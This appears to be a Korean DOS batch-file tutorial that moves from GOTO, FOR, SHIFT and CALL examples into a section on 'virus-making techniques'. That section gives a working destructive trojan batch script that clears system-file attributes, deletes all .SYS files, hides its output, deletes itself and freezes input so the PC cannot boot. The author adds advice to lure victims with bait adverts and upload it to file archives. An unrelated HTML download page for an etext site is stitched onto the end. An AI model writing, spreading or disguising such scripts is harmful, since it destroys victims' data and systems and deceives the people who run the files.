 VIEWVER.BAT @ECHO OFF GOTO VIEWVER DIR :VIEVER VER 설명하자면, GOTO 다음에 VIEWVER 이라고 했죠? 그래서 :VIEWVER 로 건너뛴 것입니다. 그뒤로 순서대로 VER 이 실행된 것이고요. 이해하셨나요? 다르게 살펴보면, :ONE :TEO :THREE 이런식이죠~ 다 GOTO 에 의해 "조건분기" 되는것이랍니다. . ** FOR 명령을 봅시다 다음을 보면, VIEWIT.BAT @ECHO OFF IF NOT '%1' == '' IF EXIST %1 TYPE %1 IF NOT '%1' == '' IF NOT EXIST %1 ECHO % 화일이없습니다 IF '%1' == '' ECHO 출력하려는 화일이름을 명령행에서 지정하십시요 이것은 전에 우리가 만든 화일 내용출력 프로그램입니다. 이것을, FOR 와 GOTO 로 좀더 단순하고 강력하게 만들어 봅시다. 만약 TYPE 으로 복수의 화일을 본다면 불가능하겠죠? 그래서 프로그램을 짜보자면, @ECHO OFF IF NOT '%1' == '' IF EXIST %1 TYPE %1 IF NOT '%1' == '' IF EXIST %1 TYPE %2 . . . . . . IF NOT '%9' == '' IF EXIST %9 TYPE %9 이렇게 길어집니다. 하지만,FOR 를 사용해 도스에서도 실행되게 단문으로 작성해보면 C:\FOR %F IN (*.BAT) DO TYPE %F 이렇게 가능해집니다. . ** SHIFT 사용하기 도스는 배치화일을 실행시킬 때마다 배치화일 명령행에서 입력한 값들을 파 라미터 %1에서 %9까지 차례대로 할당한다. 이러한 파라미터들을 사용하면 배치화일을 보다 효과적으로 사용할 수 있다.
 그러나 대부분의 응용 프로그 램에서 9개의 파라미터면 충분하지만 9개 이상의 정보를 배치화일에 전달해 야 할 경우가 더러 있다. 여기서 우리는 배치화일 명령행에서 사용자가 지 정하는 모든 값들을 배치화일이 받아들일 수 있도록 하는 도스의 SHIFT 명 령어를 설명한다. SHIFT를 이용하여 기존의 배치 프로그램을 향상시키자. SHIFT 이용하기 SHIFTEX.BAT @ECHO OFF ECHO %0 %1 %2 %3 %4 %5 %6 %7 %8 %9 SHIFT ECHO %0 %1 %2 %3 %4 %5 %6 %7 %8 %9 이렇게 실행해보자 SHIFTEX A B C D E F G H I J K L 결과는!! SHIFTEX A B C D E F G H I A B C D E F G H I J 왜 이렇게 되었을까? SHIFT 명령어를 사용하면 원래의 %0 값은 왼쪽으로 밀려나고, 원래의 %1값 으로 대치된다. 또한 할당되지 않았던 문자 J가 파라미터 %9에 비로소 할당 된다. 이리하여 배치화일은 10개의 명령행 파라미터들을 받아들일 수 있다.
 예를들어보자 SHOW1.BAT @ECHO OFF :REPEAT SHIFT IF '%0' == '' GOTO DONE ECHO %0 GORO REPEAT :DONE 마치 C 등의 언어를 보는듯한 구성이아닌가? 이것을 다음과 같이 출력된다. SHOW1 A B C A B C 설명하자면, 배치화일은 처음에 SHIFT 명령어를 수행하여 첫 배치 파라미터를 %0에 할당 한다. 그다음에는 IF명령어를 사용하여 %0이 NULL값인지를 검사한다. 만일 %0이 NULL 이라면 배치 파라미터들을 모두 출력한 것이므로 실행을 종 료한다. 첫번째 실행에서 %0에는 문자 A가 들어 있으며, 배치화일은 ECHO를 이용하여 이 값을 출력한다. 그 다음에 배치화일은 SHIFT 명령앞에 있는 REPEAT 레이블로 분기하기 위해 GOTO를 실행한다. 이때 SHIFT 명령에 의해 %0은 문자 B를 포함하게 되고, 배치화일은 이것을 출력한다.
 배치화일은 이 러한 과정을 반복하여 문자 C를 출력한다. 명령행에 더 이상 남아있는 값이 없기 때문에 SHIFT는 %0에 NULL값을 할당한다. 이것은 IF 명령어에 의해 레이블 DONE으로 분기시킨다. 팁 : 배치화일내에서 다른 배치화일 부르기!! 어떤 프로그램이든 프로그램상의 오류를 가지고 있습니다. 이것을 우리는 버그라 부르죠. 이런 오류는 대개 논리적 착오에 의한 프로그램 제작상의 문제나 실수 등에 의해 기인합니다. 이런 버그를 줄이는것은 무척 중요한 일이기도 합니다.
 대부분 배치 프로그래밍에서 많이 실수하는 부분이 있습니다. 화일내에서 다른 배치화일등을 불러서 실행하라는 명령문을 탑재했다칩시다 그냥 작성할경우 위에서 말한 버그가 발생할수 있습니다. 그래서 반드시 CALL 이란 명령어를 써서 하는것이 좋습니다. 예를들면, 외부에 AAA.BAT / BBB.BAT 이렇게 있고 현재 CCC.BAT 를 작성하고 있다고 칩시다. CCC.BAT @ECHO OFF . . CALL AAA.BAT CALL BBB.BAT . . 
이제 사용법을 아시겠죠? 이제껏 배운것은 이것을 위한 전주곡이라고나 할까........ 도스에서의 배치프로그래밍 에서는 현 도스에 널려있을지 모를 유명한 프로그램을 이용하는 방법을 사용할수 있습니다. 컴퓨터 하는 사람치고 노턴 없는사람 없겠죠? 그렇다면 당연히 be.exe 는 있을겁니다. 이것은 배치화일을 확장 시켜줄수 있습니다. 물론 그전에 이미 완벽하게 작성한 프로그램을 사용할수 있으나 때론 이용할 구석이 있는 것들이 있습니다. 예를들어, BE.EXE 로 효과음을 발생할수 있습니다. 이것을 이용하여 일정한 노래정도는 스피커로 흘릴수도 있습니다. BEEP 사용법 BE BEEP /Dn /Fn /Rn /E /Dn : 소리의 주기를 지정한다. 1/18초 1단위 /Fn : 소리의 주파수를 지정한다. n은 초당 주기 /Rn : 소리를 n 번 반복한다. /Wn : 소리 중간에 n/18 초를 기다린다 /E : 주석에서 인용부호로 둘러싸인 부분을 출력한다. 이것말구도 여러가지로 확장하여 화면 긋기,키입력 등등 여러가지로 쓰일수 있으나 대부분 필요한 도구는 현 강의자료와 함께 제공해 드리니 be로 응용이 가능하구나 하는 정도만 알아두세요.
 ** 바이러스 제작 테크닉!! **
 이제부터 게재하는 내용은 각종 테크닉입니다. 초보적인 것부터 고난도까지 차례대로 계속 이야기 할것이니 반드시 알아두기 바랍니다. * 단 한줄로 컴퓨터 화면 멈춤/ 키 입력 불능 방법 사용 : CTTY NUL 예) XXX.BAT <= 임의의 화일명 @ECHO OFF CTTY NUL ^Z 설명 : 이경우 컴퓨터는 CTTY CON 을 치지않는한 다운된것처럼 보일것입니다. CTTY 명령은 주로 PC의 통신포트중의 하나에 달려있는 장치나 터미널을 가진 사용자들을 위해 만들어진 것입니다. CTTY를 원래의 목적으로 쓰지않고 배치화일의 도중에 화면출력을 없앨수있습니다. 이것은 앞으로 응용할것이나 이거 한줄로 짠 프로그램을 컴파일시켜 써보는것도 묘미일겁니다. 자~ 아주 무식하고 단순한 트로이목마를 만들어볼까요? 
지금 만드는것은 아주 초보적인 수준으로 발견즉시 탐지당할수 있으나 발견즉시 피해를 입히며 자폭할것이니 사용하기는 좋습니다. 아이큐 한 30정도는 될겁니다. 목적 : 침투즉시 시스템 영역 파괴로 부팅불능 @ECHO OFF ATTRIB -H -R -S > NUL <= 이줄은 시스템화일의 숨김,읽기전용,시스템등의 속성을 해제시켜 지우거나 변형이 가능케합니다. "> NUL" 은 변형결과가 화면에 안뜨게 하는것입니다. DEL *.SYS < NUL <= 모든 시스템 화일을 지워버립니다. 
다음회에 전체화일을 묻는말없이 지울수있는법을 알려드리죠. DEL XXX.YYY < NUL <= 본인 스스로 해당 화일명 삭제명령, 역시 보이지않게!! CTTY NUL <= 이것까지 추가하면 시스템도 딱! 멈추겠죠? 그래서 부팅해보면 안뜬답니다. 하하하~~~~~~~~~ ^Z 어떻습니까? 여기에 화면에 어떤 메시지를 띄울수도 있겠죠? ECHO " 이 컴퓨터는 부팅영역을 나에게 빼앗겼다!! " 이런식으로요~~ 메롱~~~이나............ 아주 간단하면서 효과는 확실하죠? 현재 이건 극히 초보적인 것이나 약간만 응용하여 다른 화일을 지우거나 화일명을 바꾸어놓는 조작을 할수있습니다. 다만 상대 사용자가 바로 발견할수 있다는것이 단점이겠죠? 그래서 이것을 등록하거나 제공하기 앞서 엄청난 것이라는 광고나 어떤 미끼를 던진다면 확실히 물립니다. 소잃고 외양간 고쳐모해~~ 하지만 너무 쉽게 드러나 좀 그렇죠? 그래서~~~ 아래를 보십시요. 아래는 간단한 화일 찾기 프로그램입니다. 여기에 인공지능(?) 타이머를 추가해서 강력한 시한폭탄이 되게 만들것이니 일단은 자세히 보아주시고 원리를 보아주시기 바랍니다. 이것은 지금당장이라도 이름만 바꾸어서 컴파일시켜 자료실에 등록도 할수 있는 것입니다. @echo off if "%1"=="/?" goto help if "%1"=="" goto copyright cd\ dir %1 /s/p/w/l/o:n goto end :copyright echo. echo FileFinder (c) KIM XXX :help echo. echo Usage : filefind [filename] echo. :end 다음회에 막강한 타이머가 부착된 시한폭탄 바이러스를 보자구요~ 하하~~ 참, 더불어서 각종 배치유틸(*.COM)도 제공하겠습니다. 지금 올린 예제는 극히 기본적인 것입니다. 응용가능성이 높다는걸 아셨겠죠? 계속되는 응용과 연습이 중요합니다. 단, 조심하세요! 시스템 날리고 울지말고~~~~~~ ------------------------------------------------------------------------ 



 출처  http://home.netsgo.com/menu05/pds/menu050331_20.htm<HTML>
<HEAD>
<TITLE> etext down page </TITLE>
<SCRIPT Language="Javascript">
<!-- 
function save(){

	var WebBrowser = '<OBJECT ID="WebBrowser1" WIDTH=0 HEIGHT=0 CLASSID="CLSID:8856F961-340A-11D0-A96B-00C04FD705A2"></OBJECT>';
	document.body.insertAdjacentHTML('beforeEnd', WebBrowser);
	WebBrowser1.ExecWB(4, 2);
	}

-->
</script>
</HEAD>

<BODY BGCOLOR="#FFFFFF" >
<br>
       <table width=400 border=0 cellpadding=0 cellspacing=0 align=center valign='top'>
	   <tr height=28>
	    <td width=28 background=../bd_image/bd_top_left_green1.gif></td>
		<td bgcolor=#c1e51d><font size=3><b><i>Downloading ETEXT</i><b></font></td>
		<td width=28 background=../bd_image/bd_top_right_green1.gif></td>
		</tr>

        <td width=28 bgcolor=#d1d1d1></td>
		<td bgcolor=#d1d1d1><br><br>
		&nbsp;&nbsp;etext를 이용해 주셔서 감사합니다. 저희 etext는 아직은 많이 모자라지만, 계속해서 업데이트 되고 만들어가는 공간이니 자주 들려 주시기 바랍니다.
		<br> &nbsp;Palm사용자 여러분이 경우엔, .prc 파일의 다운로드 창이 뜨면 적절히 저장위치를 선택하시면 됩니다. <br>
		&nbsp;&nbsp;셀비안(Cellvic) 여러분, 그리고 WindowsCE계열, 또는 Newton이나 Psion 사용자 여러분들은 .ZIP 파일 형태로 제공되는 etext를 압축을 풀어서 저장하시면 됩니다. <br>
		 &nbsp;다 받으신 다음에는 아래의 버튼을 클릭하시면 계속해서 etext를 여행하실 수 있습니다.
		<br><br>
		</td>
		<td width=28 bgcolor=#d1d1d1></td>
		</tr>

		<tr>
		<td colspan=3 bgcolor=#d1d1d1 align=center>
		&nbsp; http://www.dlife.co.kr&nbsp;<input type=image src=../icon/bd_goback_gr.gif align=absmiddle border=0 onclick=history.go(-1)>
		</td>
		</tr>
	  <tr height=28>
	    <td width=28 background=../bd_image/bd_left_bottom_gray.gif></td>
	    <td bgcolor=#d1d1d1></td>
	    <td width=28 background=../bd_image/bd_right_bottom_gray.gif></td>
          </tr>
		</table>
	   </BODY>
</HTML>
